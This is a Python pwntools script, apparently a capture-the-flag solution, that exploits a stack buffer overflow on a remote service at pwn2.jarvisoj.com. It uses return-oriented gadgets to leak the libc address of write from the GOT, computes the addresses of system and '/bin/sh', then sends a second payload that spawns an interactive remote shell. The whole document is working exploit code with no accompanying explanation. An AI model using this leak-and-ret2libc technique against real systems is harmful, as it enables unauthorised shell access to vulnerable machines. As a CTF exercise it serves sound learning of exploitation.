#!/usr/bin/env python2
from pwn import *

GOT_write_addr = 0x0000000000600A58
# .text:00000000004005F8                 mov     edi, 1          ; fd
# .text:00000000004005FD                 call    _write
call_write_addr = 0x00000000004005F8
# 0x00000000004006b3 : pop rdi ; ret
set_first_arg_addr = 0x00000000004006b3
# 0x00000000004006b1 : pop rsi ; pop r15 ; ret
set_second_arg_addr = 0x00000000004006b1

conn = remote('pwn2.jarvisoj.com', 9884)

# leak addresses
print conn.read(),
conn.send_raw('A' * 0x80 + pack(GOT_write_addr + 0x80, 64) + 
              pack(set_second_arg_addr, 64) + pack(GOT_write_addr, 64) + 'fuckfuck' + 
              pack(call_write_addr, 64))
libc_write_addr = unpack(conn.read()[:8], 64)
libc_base_addr = libc_write_addr - 0x00000000000EB700
libc_system_addr = libc_base_addr + 0x0000000000046590
libc_bin_sh_addr = libc_base_addr + 0x000000000017C8C3
log.info('libc_base_addr = 0x%016x' % libc_base_addr)
log.info('libc_write_addr = 0x%016x' % libc_write_addr)
log.info('libc_system_addr = 0x%016x' % libc_system_addr)
log.info('libc_bin_sh_addr = 0x%016x' % libc_bin_sh_addr)

# send exp buf
conn.send_raw(pack(libc_system_addr, 64) + 'A' * (0x80 - 8) + 'fuckfuck' + 
              pack(set_first_arg_addr, 64) + pack(libc_bin_sh_addr, 64) + 
              pack(libc_system_addr, 64))

# get shell
conn.interactive()
